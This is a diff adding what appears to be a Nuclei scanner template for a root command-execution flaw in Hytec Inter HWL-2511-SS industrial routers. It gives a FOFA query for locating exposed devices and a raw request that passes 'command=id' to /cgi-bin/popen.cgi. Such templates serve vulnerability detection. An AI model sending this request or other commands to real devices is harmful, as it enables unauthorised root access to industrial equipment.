@@ -1,0 +1,25 @@
+id: HWL-2511-SS-RCE
+
+info:
+  name: HWL-2511-SS 路由器命令执行漏洞
+  author: changge
+  severity: critical
+  description: Hytec Inter HWL-2511-SS 是日本Hytec Inter公司的一种工业LTE路由器和Wi-Fi 接入点设备。该设备的v1.05版本及以前的版本存在命令执行漏洞，恶意攻击者可使用root 权限执行任意命令。 
+  metadata:
+    max-request: 1
+    fofa-query: body="app/feature/portForwarding.js" || body="app/app.translate-config.js"
+    verified: true
+requests:
+  - raw:
+      - |
+        GET /cgi-bin/popen.cgi?command=id HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: */*
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body,"uid")'
